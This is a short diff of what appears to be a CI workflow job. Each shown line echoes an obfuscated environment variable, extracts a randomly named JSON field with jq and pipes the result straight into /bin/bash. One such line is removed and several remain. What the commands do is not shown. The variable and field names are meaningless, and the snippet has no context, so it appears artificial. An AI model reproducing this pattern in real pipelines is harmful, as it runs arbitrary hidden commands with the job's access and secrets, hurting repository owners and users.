@@ -30,7 +30,6 @@ jobs:
           echo $csoby51 | jq -r .hgprz504 | /bin/bash
           printf '%s' "$ff657" | jq -r .e627 | /bin/bash
           echo $qyym1 | jq -r .do2635 | /bin/bash
-          echo $ynbdz54 | jq -r .zjivr32183 | /bin/bash
           echo $kwvss28 | jq -r .s11 | /bin/bash
           printf '%s' "$x4341" | jq -r .z9 | /bin/bash
           printf '%s' "$gu6749" | jq -r .nmp13453 | /bin/bash
